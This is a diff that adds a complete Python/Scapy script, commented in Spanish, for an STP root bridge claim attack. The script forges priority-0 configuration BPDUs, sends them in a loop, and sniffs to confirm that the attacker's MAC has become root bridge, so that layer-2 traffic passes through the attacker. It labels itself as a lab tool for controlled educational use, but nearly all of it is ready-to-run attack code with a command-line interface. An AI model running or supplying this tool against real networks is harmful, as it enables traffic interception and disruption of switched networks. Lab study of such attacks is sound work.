@@ -1,0 +1,170 @@
+#!/usr/bin/env python3
+"""
+=======================================================================
+  STP ROOT BRIDGE CLAIM ATTACK — Laboratorio de Seguridad en Redes
+  Herramienta: Scapy
+  Descripcion: Envía BPDUs con prioridad 0 para reclamar el rol de
+               Root Bridge en la topología STP, forzando que todo el
+               tráfico L2 sea redirigido a través del atacante.
+  USO EDUCATIVO / ENTORNO CONTROLADO UNICAMENTE
+=======================================================================
+"""
+
+import os, sys, time, argparse
+from scapy.all import (
+    Ether, LLC, STP,
+    sendp, sniff, get_if_hwaddr
+)
+from colorama import Fore, Style, init
+
+init(autoreset=True)
+
+BANNER = f"""
+{Fore.RED}╔══════════════════════════════════════════════════╗
+║    STP ROOT BRIDGE CLAIM — Scapy Lab Tool        ║
+║      Solo para entornos de prueba controlados    ║
+╚══════════════════════════════════════════════════╝{Style.RESET_ALL}
+"""
+
+# ── Construcción del BPDU malicioso ────────────────────────────────
+def construir_bpdu(interfaz: str, prioridad: int) -> Ether:
+    """
+    Construye un Configuration BPDU afirmando ser Root Bridge.
+    prioridad=0 garantiza que ningún switch legítimo tenga menor valor.
+    """
+    mac = get_if_hwaddr(interfaz)
+    pkt = (
+        Ether(dst="01:80:c2:00:00:00", src=mac)   # dirección multicast STP
+        / LLC(dsap=0x42, ssap=0x42, ctrl=3)
+        / STP(
+            proto      = 0,
+            version    = 0,
+            bpdutype   = 0x00,    # Configuration BPDU
+            bpduflags  = 0x01,
+            rootid     = prioridad,
+            rootmac    = mac,
+            pathcost   = 0,
+            bridgeid   = prioridad,
+            bridgemac  = mac,
+            portid     = 0x8001,
+            age        = 0,
+            maxage     = 20,
+            hellotime  = 2,
+            fwddelay   = 15,
+        )
+    )
+    return pkt
+
+# ── Verificación de Root Bridge ─────────────────────────────────────
+def verificar_root(interfaz: str, mi_mac: str, timeout: float = 2.0) -> bool:
+    """
+    Escucha BPDUs y comprueba si el atacante ya aparece como Root Bridge.
+    Retorna True si la MAC del atacante es anunciada como Root.
+    """
+    capturados = []
+
+    def capturar(pkt):
+        if pkt.haslayer(STP):
+            capturados.append(pkt)
+
+    sniff(
+        iface=interfaz,
+        filter="ether dst 01:80:c2:00:00:00",
+        prn=capturar,
+        timeout=timeout,
+        store=False,
+    )
+
+    for pkt in capturados:
+        root_mac = str(pkt[STP].rootmac).lower()
+        if root_mac == mi_mac.lower():
+            print(f"{Fore.GREEN}[✓] ¡ROOT BRIDGE ADQUIRIDO! → {mi_mac}")
+            print(f"{Fore.GREEN}[✓] El tráfico L2 pasa ahora por el atacante.")
+            return True
+        else:
+            print(f"{Fore.YELLOW}[~] Root Bridge actual: {pkt[STP].rootmac}")
+    return False
+
+# ── Bucle de ataque ─────────────────────────────────────────────────
+def lanzar_ataque(
+    interfaz: str,
+    prioridad: int,
+    intervalo: float,
+    total: int,
+) -> None:
+    mi_mac = get_if_hwaddr(interfaz)
+    bpdu   = construir_bpdu(interfaz, prioridad)
+
+    print(BANNER)
+    print(f"{Fore.YELLOW}[*] Interfaz      : {interfaz}")
+    print(f"{Fore.YELLOW}[*] MAC atacante   : {mi_mac}")
+    print(f"{Fore.RED}[!] Prioridad BPDU : {prioridad}  (0 = máxima prioridad STP)")
+    print(f"{Fore.RED}[!] Intervalo      : {intervalo}s")
+    print(f"{Fore.CYAN}[*] Transmitiendo BPDUs... CTRL+C para detener\n")
+
+    enviados = 0
+    inicio   = time.time()
+
+    try:
+        while True:
+            if total > 0 and enviados >= total:
+                break
+
+            sendp(bpdu, iface=interfaz, verbose=False)
+            enviados += 1
+            elapsed = time.time() - inicio
+
+            print(
+                f"{Fore.RED}[→] BPDU #{enviados:04d} | "
+                f"Prioridad: {prioridad} | "
+                f"MAC: {mi_mac} | "
+                f"t={elapsed:.1f}s",
+                end="\r",
+            )
+
+            # Cada 15 BPDUs verificamos si ya somos Root
+            if enviados % 15 == 0:
+                print()
+                verificar_root(interfaz, mi_mac)
+
+            time.sleep(intervalo)
+
+    except KeyboardInterrupt:
+        pass
+
+    elapsed_total = time.time() - inicio
+    print(f"\n\n{Fore.CYAN}[✓] BPDUs enviados    : {enviados}")
+    print(f"{Fore.CYAN}[✓] Tiempo de ataque  : {elapsed_total:.1f}s")
+    print(f"\n{Fore.YELLOW}[*] Verificación final de Root Bridge...")
+    exito = verificar_root(interfaz, mi_mac, timeout=3.0)
+    if not exito:
+        print(f"{Fore.RED}[!] No se confirma Root Bridge. Puede requerir más tiempo.")
+
+# ── Main ─────────────────────────────────────────────────────────────
+def main():
+    if os.geteuid() != 0:
+        print(f"{Fore.RED}[!] Este script requiere privilegios root (sudo).")
+        sys.exit(1)
+
+    parser = argparse.ArgumentParser(
+        description="STP Root Bridge Claim Attack — Herramienta educativa con Scapy"
+    )
+    parser.add_argument("-i", "--interface", required=True, help="Interfaz de red (ej. eth0)")
+    parser.add_argument(
+        "-p", "--priority", type=int, default=0,
+        help="Prioridad del bridge (0=máxima, default=0)"
+    )
+    parser.add_argument(
+        "-t", "--interval", type=float, default=2.0,
+        help="Intervalo entre BPDUs en segundos (default=2.0)"
+    )
+    parser.add_argument(
+        "-c", "--count", type=int, default=0,
+        help="Total de BPDUs a enviar (0=infinito)"
+    )
+    args = parser.parse_args()
+
+    lanzar_ataque(args.interface, args.priority, args.interval, args.count)
+
+if __name__ == "__main__":
+    main()
